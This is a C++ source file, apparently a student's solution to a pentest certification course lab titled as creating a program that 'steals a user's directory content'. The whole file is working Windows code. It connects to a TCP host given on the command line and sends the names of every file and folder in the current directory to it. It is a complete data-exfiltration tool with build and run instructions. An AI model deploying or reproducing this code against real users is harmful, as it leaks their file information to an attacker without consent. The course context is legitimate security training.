/*
CJ Pfenninger
06/03/2020
www.elearnsecurity.com
Pentest Student Course, eJPT Certification
C++ Programming Lab, Task 1: Create a simple program that steals a user's directory content.
To compile:
    g++ dirstealer.cpp -o dirstealer.exe -lws2_32 -std=c++17

To execute:
    dirstealer.exe [IP ADDRESS] [PORT]
*/
#define _WIN32_WINNT 0x501
#define DEFAULT_BUFLEN 512

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iostream>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

int main(int argc, char* argv[])
{
    WSADATA wsaData;
    int iResult;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    SOCKET ConnectSocket = INVALID_SOCKET;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        cout << "WSAStartup failed: " << iResult << endl;
        return 1;
    }
    cout << "WSAStartup Success!" << endl;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    // getaddrinfo is used to determine the values in the sockaddr structure.
    // The information in the sockaddr structure includes IP address of the server to connect to and the port number to use for that connection.
    iResult = getaddrinfo(argv[1], argv[2], &hints, &result);
    if (iResult != 0) {
        cout << "getaddrinfo failed: " << iResult << endl;
        // WSACleanup is used to terminate the use of the WS2_32 DLL.
        WSACleanup();
        return 1;
    }

    // Attempt to connect to the first address returned by the call to getaddrinfo
    ptr = result;
    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

    // Check for errors to ensure valid socket 
    if (ConnectSocket == INVALID_SOCKET) {
        // WSAGetLastError returns an error number associated with the last error that occurred.
        cout << "Error at socket(): " << WSAGetLastError() << endl;
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // To connect to a socket, call the connect function and pass in the created socket and the sockaddr structure.
    // Connect to a server
    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }

    freeaddrinfo(result);
    if (ConnectSocket == INVALID_SOCKET) {
        cout << "Unable to connect to server" << endl;
        WSACleanup();
        return 1;
    }

    // Iterate over all items in the pwd
    for (const auto& item : fs::directory_iterator("./")) {
        
        // get stem and extension for each item
        string filename = item.path().stem().string() + item.path().extension().string();
        // directories get a /  at the end
        if (item.is_directory()) filename += "/";
        filename += "\n";

        // full send, bud
        iResult = send(ConnectSocket, filename.c_str(), (int)strlen(filename.c_str()), 0);
        if (iResult == SOCKET_ERROR) {
            cout << "send failed: " << WSAGetLastError() << endl;
            closesocket(ConnectSocket);
            WSACleanup();
            return 1;
        }
    }

    // Shut down the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        cout << "Shutdown failed: " << WSAGetLastError() << endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    return 0;
}